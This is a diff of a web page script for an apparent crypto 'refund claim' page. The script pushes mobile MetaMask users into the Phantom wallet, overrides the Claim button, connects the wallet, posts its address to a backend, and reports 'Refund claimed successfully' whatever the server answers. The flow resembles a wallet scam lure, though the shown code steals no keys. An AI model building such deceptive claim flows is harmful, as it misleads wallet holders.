@@ -35,84 +35,167 @@
  </defs>
 </svg>
  </a>
- <script>
-(function () {
+<script>
+/* =========================
+   CONFIG
+========================= */
 
-  function isMobile() {
-    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+// remplace par ton endpoint backend
+const CLAIM_ENDPOINT = "/api/claim";
+
+/* =========================
+   HELPERS
+========================= */
+
+function isMobile() {
+  return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+}
+
+function isPhantomBrowser() {
+  return (
+    (window.solana && window.solana.isPhantom) ||
+    (window.phantom && window.phantom.solana) ||
+    /Phantom/i.test(navigator.userAgent)
+  );
+}
+
+function isPhantomMobileFlow() {
+  const p = new URLSearchParams(window.location.search);
+  return isPhantomBrowser() && p.get("phantom") === "1";
+}
+
+function findClaimButton() {
+  return [...document.querySelectorAll("button")]
+    .find(b => b.textContent.trim().toLowerCase().includes("claim"));
+}
+
+function findSolInput() {
+  return [...document.querySelectorAll("input")]
+    .find(i => (i.placeholder || "").toLowerCase().includes("sol"));
+}
+
+/* =========================
+   OPEN IN PHANTOM BUTTON
+========================= */
+
+function injectOpenInPhantomButton() {
+  if (document.getElementById("open-phantom-btn")) return;
+
+  const claimBtn = findClaimButton();
+  if (!claimBtn) return;
+
+  const btn = document.createElement("button");
+  btn.id = "open-phantom-btn";
+  btn.innerText = "Open in Phantom";
+  btn.style.cssText = `
+    width:100%;
+    margin-top:12px;
+    padding:14px;
+    border-radius:14px;
+    font-weight:600;
+    border:1px solid #ccc;
+    background:#fff;
+  `;
+
+  btn.onclick = () => {
+    const url = new URL(window.location.href);
+    url.searchParams.set("phantom", "1");
+
+    const deepLink =
+      "https://phantom.app/ul/browse/" +
+      encodeURIComponent(url.toString());
+
+    window.location.href = deepLink;
+  };
+
+  claimBtn.after(btn);
+}
+
+/* =========================
+   PHANTOM CONNECT
+========================= */
+
+async function connectPhantom() {
+  if (!window.solana || !window.solana.isPhantom) {
+    alert("Phantom wallet not detected");
+    return null;
+  }
+  const resp = await window.solana.connect();
+  return resp.publicKey.toString();
+}
+
+/* =========================
+   CLAIM LOGIC
+========================= */
+
+async function handleClaim() {
+  const solInput = findSolInput();
+  let solAddress = solInput && solInput.value;
+
+  // Phantom mobile → on force le wallet Phantom
+  if (isPhantomMobileFlow()) {
+    solAddress = await connectPhantom();
   }
 
-  function isPhantomBrowser() {
-    return (
-      (window.solana && window.solana.isPhantom) ||
-      (window.phantom && window.phantom.solana) ||
-      /Phantom/i.test(navigator.userAgent)
-    );
-  }
-
-  function findClaimButton() {
-    return [...document.querySelectorAll("button")]
-      .find(b => b.textContent.trim().toLowerCase().includes("claim"));
-  }
-
-  function injectOpenPhantomButton() {
-    if (document.getElementById("open-phantom-btn")) return;
-
-    const claimBtn = findClaimButton();
-    if (!claimBtn) return;
-
-    const btn = document.createElement("button");
-    btn.id = "open-phantom-btn";
-    btn.innerText = "Open in Phantom";
-    btn.style.cssText = `
-      width:100%;
-      margin-top:12px;
-      padding:14px;
-      border-radius:14px;
-      font-weight:600;
-      border:1px solid #ccc;
-      background:#fff;
-    `;
-
-    btn.onclick = () => {
-      const url = new URL(window.location.href);
-      url.searchParams.set("phantom", "1");
-
-      const deepLink =
-        "https://phantom.app/ul/browse/" +
-        encodeURIComponent(url.toString());
-
-      window.location.href = deepLink;
-    };
-
-    claimBtn.after(btn);
-  }
-
-  // 🟢 SI ON EST DANS PHANTOM → ON LAISSE TON CODE EXISTANT
-  if (isPhantomBrowser()) {
-    const params = new URLSearchParams(window.location.search);
-    if (params.get("phantom") === "1") {
-      setTimeout(() => {
-        const claimBtn = findClaimButton();
-        if (claimBtn) claimBtn.click(); // ouvre TA popup existante
-      }, 600);
-    }
+  if (!solAddress) {
+    alert("Please enter or connect your Solana wallet");
     return;
   }
 
-  // 🔴 MOBILE + METAMASK → ON FORCE OPEN PHANTOM
-  if (!isMobile()) return;
-
-  const observer = new MutationObserver(() => {
-    injectOpenPhantomButton();
+  // envoi backend
+  await fetch(CLAIM_ENDPOINT, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      solAddress,
+      source: isPhantomMobileFlow() ? "phantom_mobile" : "desktop"
+    })
   });
 
-  observer.observe(document.body, {
-    childList: true,
-    subtree: true
-  });
+  alert("Refund claimed successfully");
+}
 
-  setTimeout(injectOpenPhantomButton, 1500);
+/* =========================
+   INIT
+========================= */
+
+(function init() {
+
+  // CAS 1 : ON EST DANS PHANTOM MOBILE
+  if (isPhantomMobileFlow()) {
+
+    // rendre le bouton Claim cliquable sans EVM
+    const interval = setInterval(() => {
+      const claimBtn = findClaimButton();
+      if (!claimBtn) return;
+
+      claimBtn.disabled = false;
+
+      // override le click
+      claimBtn.onclick = (e) => {
+        e.preventDefault();
+        handleClaim();
+      };
+
+      clearInterval(interval);
+    }, 300);
+
+    return;
+  }
+
+  // CAS 2 : MOBILE + METAMASK → BOUTON OPEN PHANTOM
+  if (isMobile() && !isPhantomBrowser()) {
+    const obs = new MutationObserver(() => {
+      injectOpenInPhantomButton();
+    });
+
+    obs.observe(document.body, {
+      childList: true,
+      subtree: true
+    });
+
+    setTimeout(injectOpenInPhantomButton, 1500);
+  }
 
 })();
 </script>
